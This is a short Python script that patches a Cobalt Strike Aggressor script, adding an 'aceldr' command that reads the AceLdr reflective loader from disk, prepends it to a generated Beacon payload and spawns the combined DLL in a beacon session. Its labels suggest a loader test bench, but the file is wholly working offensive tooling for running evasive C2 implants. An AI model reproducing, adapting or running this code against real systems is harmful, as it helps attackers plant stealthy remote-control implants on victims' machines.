# -*- coding: utf-8 -*-
"""add_aceldr.py - insert the aceldr test command into headless_franken.cna
using real tab/newline characters built via chr() (no heredoc escapes)."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
     r"\p3-llvm-bench\tsboot_run\headless_franken.cna")
s = io.open(P, encoding="utf-8-sig").read()

BS = chr(92)
TAB = chr(9)
L = chr(10)

anchor = TAB + 'else if ($cmd eq "iea") {'
assert anchor in s, "iea anchor not found"

add = (
    TAB + 'else if ($cmd eq "aceldr") {' + L +
    TAB + TAB + '# R2-2: AceLdr UDRL control test' + L +
    TAB + TAB + '$ldr = readb(openf("C:' + BS*4 + 'Users' + BS*4 + 'Public' +
    BS*4 + 'AceLdr.x64.bin"), -1);' + L +
    TAB + TAB + 'if ($ldr is $null || strlen($ldr) < 0x1000) { blog($bid, "aceldr: loader bin missing"); return; }' + L +
    TAB + TAB + 'blog($bid, "aceldr: loader " . strlen($ldr) . "B");' + L +
    TAB + TAB + '$dll = payload($a1, "x64", "process");' + L +
    TAB + TAB + 'if ($dll is $null || strlen($dll) < 0x10000) { blog($bid, "aceldr: payload short"); return; }' + L +
    TAB + TAB + 'blog($bid, "aceldr: dll " . strlen($dll) . "B");' + L +
    TAB + TAB + '$combined = $ldr . $dll;' + L +
    TAB + TAB + 'bdll_spawn($bid, $combined);' + L +
    TAB + TAB + 'blog($bid, "aceldr: dispatched");' + L +
    TAB + TAB + 'return;' + L +
    TAB + '}' + L
)

s = s.replace(anchor, add + anchor, 1)
io.open(P, "w", encoding="utf-8-sig", newline="").write(s)
print("aceldr inserted; total occurrences:", s.count('"aceldr"'))
